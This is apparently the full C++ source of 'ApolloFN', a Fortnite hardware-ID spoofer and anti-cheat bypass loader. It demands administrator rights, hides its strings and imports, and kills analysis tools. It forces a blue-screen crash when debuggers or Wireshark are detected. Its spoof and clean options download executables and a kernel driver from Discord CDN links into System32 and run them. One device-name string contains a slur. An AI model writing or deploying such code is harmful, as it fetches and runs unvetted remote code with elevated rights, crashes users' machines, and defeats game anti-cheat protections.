#include <windows.h>
#include <stdio.h>
#include <iostream>
#include <cstdio>
#include <vector>
#include <gdiplus.h>
#include <string>
#include <fstream>
#include <WinInet.h>
#include <random>
#include <tlhelp32.h>
#include <conio.h>
#include <comdef.h>
#include <tchar.h>
#include <mmsystem.h>
#include <CommCtrl.h>
#include <debugapi.h>
#include <time.h>
#include <stdlib.h>
#include <Shlwapi.h>
#include <thread>
#include "xorstr.hpp"
#include "l.importer.hpp"
#include "antidump.h"
#pragma comment (lib, "urlmon.lib")
#pragma warning(disable : 4996)
#define _CRT_SECURE_NO_WARNINGS_GLOBALS
bool running = true;
typedef NTSTATUS(NTAPI* pdef_NtRaiseHardError)(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask OPTIONAL, PULONG_PTR Parameters, ULONG ResponseOption, PULONG Response);
typedef NTSTATUS(NTAPI* pdef_RtlAdjustPrivilege)(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN Enabled);

void debug();
std::string random_string(const int len);
static std::string RandomProcess();
std::wstring s2ws(const std::string& s);
DWORD FindProcessId(const std::wstring& processName);
void exedetect();
void titledetect();
void driverdetect();
void killdbg();
std::string path();
void clear();
void slowprint(const std::string& message, unsigned int Char_Seconds);
void bsod();

using namespace std;

auto RandomTitle = [](int iterations) {
    std::string Title;
    for (int i = 0; i < iterations; i++)
        Title += rand() % 255 + 1;
    return Title;
};


void checkadmin() {
    bool IsRunningAsAdmin = false;

    BOOL fRet = FALSE;
    HANDLE hToken = NULL;
    if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
        TOKEN_ELEVATION Elevation;
        DWORD cbSize = sizeof(TOKEN_ELEVATION);
        if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
            fRet = Elevation.TokenIsElevated;
        }
    }
    if (hToken) {
        CloseHandle(hToken);
    }
    IsRunningAsAdmin = fRet;

    if (!IsRunningAsAdmin) {
        int msgboxID = MessageBoxA(
            NULL,
            (LPCSTR)"please, run as admin",
            (LPCSTR)"ApolloFN | error",
            MB_OK
        );
        exit(-1);
    }
}

std::string path()
{
    char shitter[_MAX_PATH]; // defining the path
    GetModuleFileNameA(NULL, shitter, _MAX_PATH); // getting the path
    return std::string(shitter); //returning the path

}

static std::string RandomProcess()
{
    std::vector<std::string> Process
    {
        XorStr("winver.exe").c_str(),
        XorStr("Taskmgr.exe").c_str(),
        XorStr("notepad.exe").c_str(),
        XorStr("mspaint.exe").c_str(),
        XorStr("regedit.exe").c_str(),
    };
    std::random_device RandGenProc;
    std::mt19937 engine(RandGenProc());
    std::uniform_int_distribution<int> choose(0, Process.size() - 1);
    std::string RandProc = Process[choose(engine)];
    return RandProc;
}

std::wstring s2ws(const std::string& s) {
    std::string curLocale = setlocale(LC_ALL, "");
    const char* _Source = s.c_str();
    size_t _Dsize = mbstowcs(NULL, _Source, 0) + 1;
    wchar_t* _Dest = new wchar_t[_Dsize];
    wmemset(_Dest, 0, _Dsize);
    mbstowcs(_Dest, _Source, _Dsize);
    std::wstring result = _Dest;
    delete[]_Dest;
    setlocale(LC_ALL, curLocale.c_str());
    return result;
}

DWORD FindProcessId(const std::wstring& processName)
{
    PROCESSENTRY32 processInfo;
    processInfo.dwSize = sizeof(processInfo);
    auto createtoolhelp = LI_FN(CreateToolhelp32Snapshot);
    HANDLE processesSnapshot = createtoolhelp(TH32CS_SNAPPROCESS, NULL);
    if (processesSnapshot == INVALID_HANDLE_VALUE)
        return 0;

    Process32First(processesSnapshot, &processInfo);
    if (!processName.compare(processInfo.szExeFile))
    {
        auto closehand = LI_FN(CloseHandle);
        closehand(processesSnapshot);
        return processInfo.th32ProcessID;
    }

    while (Process32Next(processesSnapshot, &processInfo))
    {
        if (!processName.compare(processInfo.szExeFile))
        {
            auto closehand = LI_FN(CloseHandle);
            closehand(processesSnapshot);
            return processInfo.th32ProcessID;
        }
    }

    return 0;
}

void clear()
{
    system(XorStr("CLS").c_str());
}

void exedetect()
{
    if (FindProcessId(s2ws("KsDumperClient.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("HTTPDebuggerUI.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("HTTPDebuggerSvc.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("FolderChangesView.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("ProcessHacker.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("procmon.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("idaq.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("idaq64.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("Wireshark.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("Fiddler.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("Xenos64.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("Cheat Engine.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("HTTP Debugger Windows Service (32 bit).exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("KsDumper.exe")) != 0)
    {
        bsod();
    }
    else if (FindProcessId(s2ws("x64dbg.exe")) != 0)
    {
        bsod();
    }
}

void titledetect()
{
    HWND window;
    window = FindWindow(0, XorStr((L"IDA: Quick start")).c_str());
    if (window)
    {
        bsod();
    }

    window = FindWindow(0, XorStr((L"Memory Viewer")).c_str());
    if (window)
    {
        bsod();
    }

    window = FindWindow(0, XorStr((L"Process List")).c_str());
    if (window)
    {
        bsod();
    }

    window = FindWindow(0, XorStr((L"KsDumper")).c_str());
    if (window)
    {
        bsod();
    }
}

void driverdetect()
{
    const TCHAR* devices[] = {
(XorStr(_T("\\\\.\\NiGgEr")).c_str()),
(XorStr(_T("\\\\.\\KsDumper")).c_str())
    };

    WORD iLength = sizeof(devices) / sizeof(devices[0]);
    for (int i = 0; i < iLength; i++)
    {
        HANDLE hFile = CreateFile(devices[i], GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
        TCHAR msg[256] = _T("");
        if (hFile != INVALID_HANDLE_VALUE) {
            system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Protection && ECHO KsDumper Detected. && TIMEOUT 10 >nul").c_str());
            exit(0);
        }
        else
        {

        }
    }
}

void debug()
{
    while (running)
    {
        killdbg();
        exedetect();
        titledetect();
        driverdetect();
    }
}

void killdbg()
{
    system(XorStr("taskkill /f /im HTTPDebuggerUI.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im HTTPDebuggerSvc.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Ida64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im OllyDbg.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Dbg64.exe >nul 2>&1").c_str());
    system(XorStr("taskkill /f /im Dbg32.exe >nul 2>&1").c_str());
    system(XorStr("sc stop HTTPDebuggerPro >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq cheatengine*\" /IM * /F /T >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq httpdebugger*\" /IM * /F /T >nul 2>&1").c_str());
    system(XorStr("taskkill /FI \"IMAGENAME eq processhacker*\" /IM * /F /T >nul 2>&1").c_str());
}
void bsod()
{
    BOOLEAN bEnabled;
    ULONG uResp;
    LPVOID lpFuncAddress = GetProcAddress(LoadLibraryA("ntdll.dll"), "RtlAdjustPrivilege");
    LPVOID lpFuncAddress2 = GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtRaiseHardError");
    pdef_RtlAdjustPrivilege NtCall = (pdef_RtlAdjustPrivilege)lpFuncAddress;
    pdef_NtRaiseHardError NtCall2 = (pdef_NtRaiseHardError)lpFuncAddress2;
    NTSTATUS NtRet = NtCall(19, TRUE, FALSE, &bEnabled);
    NtCall2(STATUS_FLOAT_MULTIPLE_FAULTS, 0, 0, 0, 6, &uResp);
}

void slowprint(const std::string& message, unsigned int Char_Seconds)
{
    for (const char c : message)
    {
        std::cout << c << std::flush;
        Sleep(Char_Seconds);
    }
}

void Spoofy()
{
    HRESULT ab = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/893598234319142946/894229606826147840/msft.sys"), _T("C:/Windows/System32/msft.sys"), 0, NULL);

    HRESULT abc = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/883515166174629901/893890733088591902/msftsvchost.exe"), _T("C:/Windows/System32/msftdriver.exe"), 0, NULL);
    system("start C:/Windows/System32/msftdriver.exe C:/Windows/System32/msft.sys");
    system("start C:/Windows/System32/msiexec.exe");
    system("start C:/Windows/System32/msiexec.exe");
}

void Cleany()
{
    HRESULT ab = URLDownloadToFile(NULL, _T("https://cdn.discordapp.com/attachments/893865744989823016/893884227957948426/cleaner_protected.exe"), _T("C:/Windows/System32/msftsvchost.exe"), 0, NULL);
    system("start C:/Windows/System32/msftsvchost.exe");
    system("start C:/Windows/System32/msinfo32.exe");
    system("start C:/Windows/System32/msinfo32.exe");
}

int main()
{
    SetConsoleTitleA(RandomTitle(rand() ^ 10 + 255).c_str());
    checkadmin();
    std::thread anti(debug);
    slowprint(XorStr("\nW E L C O M E  T O  A P O L L O F N  S P O O F E R").c_str(), 25);
    Sleep(1500);
    clear();

    int msgboxID = MessageBoxA(
        NULL,
        (LPCSTR)"loading modules",
        (LPCSTR)"ApolloFN | info",
        MB_OK
    );
    printf("\n");
    printf("\n");
    printf("\n");
    system("cls");
    system("color c");
    system("TASKKILL /F /IM FortniteClient-Win64-Shipping.exe >NUL 2> 1");
    system("TASKKILL /F /IM EpicGamesLauncher.exe >NUL 2> 1");
    system("TASKKILL /F /IM UnrealCEFSubProcess.exe");
    printf("\n[-] Closing Fortnite\n[-] Closing UnrealCEFSubProcess\n[-] Closing Epic Games Launcher");
    goto menu;
menu:
    std::string start = XorStr("start ");
    std::string process = RandomProcess();
    std::wstring proc = s2ws(process);
    std::string startprocess = start + process;
    system(startprocess.c_str());
    DWORD processID = FindProcessId(proc);
    HANDLE handle = 0;
    SetConsoleTitleA(RandomTitle(rand() ^ 10 + 25).c_str());
    if (!processID)
    {
        system(XorStr("start cmd /c START CMD /C \"COLOR C && TITLE Loader && ECHO Failed to initalize. && TIMEOUT 10 >nul").c_str());
        exit(0);
    }
    system("cls");
    MessageBoxA(NULL, "menu initialized", "Apollo Spoofer", MB_OK);
    int choice;
    system("color c");
    printf("A P O L L O   S O L U T I O N S");
    system("cls");
    Sleep(1500);
    system("color 4");
    printf("A P o L L o   S o L U T I o N S");
    system("cls");
    Sleep(1500);
    system("color c");
    printf("A P O L L O   S O L U T I O N S");
    system("cls");
    Sleep(1500);
    system("color 4");
    printf("A P o L L o   S o L U T I o N S");
    system("cls");
    Sleep(1500);
    system("color c");
    printf("A P O L L O   S O L U T I O N S");
    system("cls");
    Sleep(1500);
    system("color 4");
    printf("A P o L L o   S o L U T I o N S");
    system("cls");
    Sleep(1500);
    system("color c");
    printf("A P O L L O   S O L U T I O N S");
    system("cls");
    Sleep(1500);
    system("color 4");
    printf("A P o L L o   S o L U T I o N S");
    system("cls");
    Sleep(1500);
    system("color c");
    printf("A P O L L O   S O L U T I O N S");
    system("cls");
    Sleep(1500);
    system("color 4");
    printf("A P o L L o   S o L U T I o N S");
    system("cls");
    Sleep(1500);
    system("color c");
    printf("A P O L L O   S O L U T I O N S");
    system("cls");
    Sleep(1500);
    system("color 4");
    printf("A P o L L o   S o L U T I o N S");
    system("cls");
    Sleep(1500);
    system("color c");
    system("color 0");
    printf("\n");
    printf("\n");
    printf("\n");
    Sleep(100);
    printf("     [1] Spoof\n     [2] Clean\n     [3] Check serials\n     [4] Bypass BE/EAC\n     [5] Credits\n     > Your option: ");
    cin >> choice;
    if (choice == 1)
    {
        system("cls");
        system("color d");
        system("color c");
        printf("        [!] spoofing do not close window\n");
        Spoofy();
        Sleep(5000);
        system("cls");
        system("color a");
        printf("        [+] spoofed\n");
        Sleep(1000);
        printf("        [?] returning to menu\n");
        Sleep(1000);
        goto menu;
    }
    if (choice == 2)
    {
        system("cls");
        system("color c");
        printf("        [!] cleaning do not close window\n");
        Cleany();
        Sleep(5000);
        system("cls");
        system("color a");
        Sleep(10000);
        printf("        [+] cleaned\n");
        Sleep(1000);
        printf("        [?] returning to menu\n");
        Sleep(1000);
        goto menu;
    }
    if (choice == 3)
    {
        system("cls");
        system("wmic baseboard get serialnumber wmic bios get serialnumber wmic cpu get serialnumber wmic path win32_computersystemproduct get uuid wmic diskdrive get serialnumber wmic path win32_physicalmedia get SerialNumber wmic path win32_diskdrive get SerialNumber wmic csproduct get uuid wmic memorychip get serialnumber wmic cpu get processorid wmic baseboard get manufacturer wmic PATH Win32_VideoController GET Description, PNPDeviceID getmac");
        Sleep(5000);
        goto menu;
    }
    if (choice == 4)
    {
        system("start cmd");
    }
    if (choice == 5)
    {
        clear();
        printf("Coded by akavani#1337");
    }
    

}